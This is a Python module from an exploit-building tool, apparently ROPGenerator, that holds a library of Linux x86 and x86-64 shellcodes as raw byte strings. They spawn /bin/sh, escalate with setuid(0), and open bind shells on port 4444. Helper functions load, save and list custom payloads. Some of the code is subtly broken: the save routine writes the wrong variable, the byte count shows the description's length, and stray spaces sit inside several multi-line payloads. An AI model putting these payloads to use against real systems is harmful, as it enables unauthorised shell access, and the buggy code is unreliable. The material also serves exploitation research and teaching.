# ROPGenerator - Shellcode module 
# Managing shellcodes 
import ropgenerator.Analysis as Analysis
from ropgenerator.Colors import string_special, string_bold
from ropgenerator.Config import ROPGENERATOR_DIRECTORY, ARCH


# List of shellcodes 
# A shellcode is stored as a pair (shellcode, description)
native_shellcodes = dict()
custom_shellcodes = dict()

def read_shellcodes(filename):
    res = [] 
    try:
        f = open(filename, 'r')
        while(True):
            l1 = f.readline()[:-1]
            l2 = f.readline()[:-1]
            if( not l2 ):
                break
            res.append([l1.decode('hex'), l2])
        f.close()
    except:
        res = []
    return res

# X86 shellcodes 
native_shellcodes['X86'] = [
("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\
\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68", "LINUX - Obfuscated execve(/bin/sh) - by Russell Willis"),
("\xeb\x12\x5b\x31\xc9\xb1\x75\x8a\x03\x34 \
\x1e\x88\x03\x43\x66\x49\x75\xf5\xeb\x05 \
\xe8\xe9\xff\xff\xff\x74\x78\x46\x74\x1f \
\x45\x2f\xd7\x4f\x74\x1f\x74\x1c\x97\xff \
\xd3\x9e\x97\xd8\x2f\xcc\x4c\x78\x76\x0f \
\x42\x78\x76\x1c\x1e\x97\xff\x74\x0e\x4f \
\x4e\x97\xff\xad\x1c\x74\x78\x46\xd3\x9e \
\xae\x78\xad\x1a\xd3\x9e\x4c\x48\x97\xff \
\x5d\x74\x78\x46\xd3\x9e\x97\xdd\x74\x1c \
\x47\x74\x21\x46\xd3\x9e\xfc\xe7\x74\x21 \
\x46\xd3\x9e\x2f\xcc\x4c\x76\x70\x31\x6d \
\x76\x76\x31\x31\x7c\x77\x97\xfd\x4c\x78 \
\x76\x33\x77\x97\xff\x4c\x4f\x4d\x97\xff \
\x74\x15\x46\xd3\x9e\x74\x1f\x46\x2f\xc5 \
\xd3\x9e", "LINUX - Port Bind 4444 (XOR encoded) - by Rick"),
("\x6a\x17\x58\x31\xdb\xcd\x80\xb0\x2e\xcd\x80\x6a\x0b\x58\
\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\
\x52\x53\x89\xe1\xcd\x80", "LINUX - setuid(0)+setgid(0)+execve(/bin/sh, [/bin/sh,NULL]) - by TheWorm")
]
custom_shellcodes['X86'] = read_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86.custom')
# X86-64 shellcodes 
native_shellcodes['X86-64'] = [
('1\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05',
    'LINUX - Execute /bin/sh - by Dad`'), 
('H1\xff\xb0i\x0f\x05H1\xd2H\xbb\xff/bin/shH\xc1\xeb\x08SH\x89\xe7H1\xc0PWH\x89\xe6\xb0;\x0f\x05j\x01_j<X\x0f\x05', 
     'LINUX - setuid(0) + execve(/bin/sh) - by evil.xi4oyu'),
("\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06 \
\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c \
\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05 \
\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89 \
\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\
\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\
\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\
\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\
\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05", "LINUX - Bind shell port 4444 - by evil.xi4oyu")  
]
custom_shellcodes['X86-64'] = read_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86-64.custom')

def write_shellcodes(filename, data):
    try:
        f = open(filename, 'w')
        for (shellcode, info) in data:
            f.write(shellcode+'\n'+data+'\n')
        f.close()
    except:
        return
        
def save_shellcodes():
    write_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86.custom', custom_shellcodes['X86'])
    write_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86-64.custom', custom_shellcodes['X86-64'])

def show_shellcodes(arch):
    def short_shellcode(raw):
        res =  "'\\x" + "\\x".join(["%02x"%ord(c) for c in raw]) + "'"
        if( len(res) > 50 ):
            res = res[:46] + "...'"
        return res
    
    global native_shellcodes
    global custom_shellcodes
    
    if( arch not in Analysis.supportedArchs ):
        print("Error. Architecture {} is not supported".format(arch))
        
    print(string_bold('\n\t------------------------------------'))
    print(string_bold("\tAvailable payloads for arch " + string_special(arch)))
    print(string_bold('\t------------------------------------'))
    
    if( (not native_shellcodes[arch])and(not custom_shellcodes[arch])):
        print("\n\tNo shellcodes available for architecture " + arch)
    i = 0
    for shellcode in custom_shellcodes[arch] + native_shellcodes[arch] :
        i = i + 1
        print("\n\t({}) {}\n\t{} - {} bytes".format(string_bold(str(i)), shellcode[1], \
            string_special(short_shellcode(shellcode[0])), str(len(shellcode[1]))))
    
def add_shellcode(arch, shellcode, description):
    global custom_shellcodes
    custom_shellcodes[arch].append((shellcode, description))
